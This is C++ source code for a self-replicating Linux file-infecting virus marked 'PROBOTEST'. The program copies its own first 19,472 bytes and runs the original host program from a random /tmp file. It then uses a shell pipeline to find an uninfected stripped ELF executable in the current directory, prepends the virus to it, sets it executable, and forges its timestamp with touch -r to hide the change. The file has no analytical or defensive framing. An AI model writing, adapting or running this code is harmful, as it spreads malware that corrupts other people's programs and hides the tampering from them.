#include <iostream>
#include <fstream>
#include <unistd.h>

const char* IDENTIFIER = "PROBOTEST";
const int MYSIZE = 19472;

using namespace std;

char* which(char* w);

int main (int argc, char** argv) {
    pid_t childpid = fork();
    srand(time(0));
    int c;
    string exe = "/tmp/", vir = "/tmp/", me = (string) argv[0], command;
    me = which(argv[0]);
    me = me.substr(0, me.size() - 1);
    // cout << "\n" << me << "\n\n";
    for (int i = 0; i < 8; i++) {
        exe += (char) ((rand() % 26) + 65);
        vir += (char) ((rand() % 26) + 65);
    }
    ifstream fi(me);
    ofstream fo(exe), fv(vir);
    if (fi.is_open() && fo.is_open() && fv.is_open()) {
        for (int i = 0; i < MYSIZE; i++) fv << (char) fi.get();
        fi.seekg(MYSIZE, fi.beg);
        while ((c = fi.get()) != -1) fo << (char) c;
        fi.close(); fo.close(); fv.close();
        command = "/bin/chmod ug+rwx ";
        command += exe;
        c = system( command.c_str() );
        if (childpid == 0) {
            c = execv((exe).c_str(), argv);
            return 0;
        } else {
            command = "/bin/rm -f ";
            command += exe;
            c = system( command.c_str() );
            command = "VIR=$(for n in `find -mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
do \
file $n | grep -q ELF && ( \
grep -q PROBOTEST $n || ( \
echo \"$n\" \
) \
); \
done | tail -1); \
if [ ! -z \"$VIR\" ]; then \
file $VIR | grep -q stripped$ && (\
mv $VIR ${VIR}__ && \
cat ";
            command += vir;
            command += " ${VIR}__ >$VIR && \
chmod ugo+x $VIR && \
touch -r ${VIR}__ $VIR \
) \
fi; \
rm -f ${VIR}__ ";
            command += vir;
            c = system( (command).c_str() );
        }
    }
}

char* which(char* w) {
    string command = "/usr/bin/which ";
    command += w;
    FILE *which_fp = popen((command).c_str(), "r");
    char buffer[1024];
    char* output = fgets(buffer, sizeof(buffer), which_fp);
    pclose(which_fp);
    return output;
}